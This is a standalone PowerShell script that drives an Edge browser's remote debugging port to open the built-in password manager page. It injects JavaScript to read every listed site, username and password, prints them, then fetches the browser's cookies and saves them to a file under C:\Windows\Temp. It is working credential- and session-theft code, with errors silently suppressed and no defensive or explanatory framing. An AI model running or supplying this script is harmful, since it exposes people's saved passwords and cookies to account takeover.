$ErrorActionPreference = 'SilentlyContinue'

# Get the target list and find the password manager page
$targets = (irm http://127.0.0.1:9222/json/list) | ConvertFrom-Json
$pmTarget = $targets | Where-Object { $_.url -match 'password' } | Select-Object -First 1

if (-not $pmTarget) {
    Write-Output "no password-manager target found. Targets:"
    foreach ($t in $targets) { Write-Output "  $($t.type): $($t.url)" }
    # Create one
    $new = (irm "http://127.0.0.1:9222/json/new?url=edge://password-manager/passwords") | ConvertFrom-Json
    Start-Sleep 3
    $targets = (irm http://127.0.0.1:9222/json/list) | ConvertFrom-Json
    $pmTarget = $targets | Where-Object { $_.url -match 'password' } | Select-Object -First 1
    if (-not $pmTarget) {
        Write-Output "still no target after navigation"
        exit
    }
}

$wsUrl = $pmTarget.webSocketDebuggerUrl
Write-Output "connecting to: $wsUrl"

# Connect to the page's WebSocket
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$wsUrl, $ct).Wait()
Write-Output "connected: $($ws.State)"

# Wait for page to load
Start-Sleep 5

# Use CDP Runtime.evaluate to extract passwords via DOM
$js = '
(function() {
    var results = [];
    var rows = document.querySelectorAll("password-row, cr-password-list-item, settings-password-list-item");
    rows.forEach(function(row) {
        var site = row.shadowRoot ? row.shadowRoot.querySelector("#originUrl, .url, a") : null;
        var user = row.shadowRoot ? row.shadowRoot.querySelector("#username, .username") : null;
        var pass = row.shadowRoot ? row.shadowRoot.querySelector("#password, .password, input[type=password]") : null;
        results.push({
            site: site ? site.textContent.trim() : "",
            user: user ? user.textContent.trim() : "",
            pass: pass ? (pass.value || pass.textContent.trim()) : ""
        });
    });
    return JSON.stringify(results);
})()
'

$msg = '{"id":1,"method":"Runtime.evaluate","params":{"expression":' + ($js | ConvertTo-Json -Compress) + ',"returnByValue":true}}'
$b = [System.Text.Encoding]::UTF8.GetBytes($msg)
$s = [ArraySegment[byte]]::new($b)
$ws.SendAsync($s, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()

$buf = [byte[]]::new(10485760)
$s2 = [ArraySegment[byte]]::new($buf)
$r = $ws.ReceiveAsync($s2, $ct).Result
$resp = [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
Write-Output "response ($($r.Count) bytes):"
Write-Output $resp

# Also try Network.getAllCookies via the page target
$msg2 = '{"id":2,"method":"Network.getCookies"}'
$b2 = [System.Text.Encoding]::UTF8.GetBytes($msg2)
$s3 = [ArraySegment[byte]]::new($b2)
$ws.SendAsync($s3, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
$r2 = $ws.ReceiveAsync($s2, $ct).Result
$resp2 = [System.Text.Encoding]::UTF8.GetString($buf, 0, $r2.Count)
$resp2 | Out-File C:\Windows\Temp\ziti\page_cookies.json -Encoding utf8
Write-Output ""
Write-Output "cookies ($($r2.Count) bytes) saved to page_cookies.json"

$ws.Dispose()

# Download the results via browser/dir (files are in C:\Windows\Temp\ziti)
Write-Output ""
Write-Output "results saved to C:\Windows\Temp\ziti\page_cookies.json"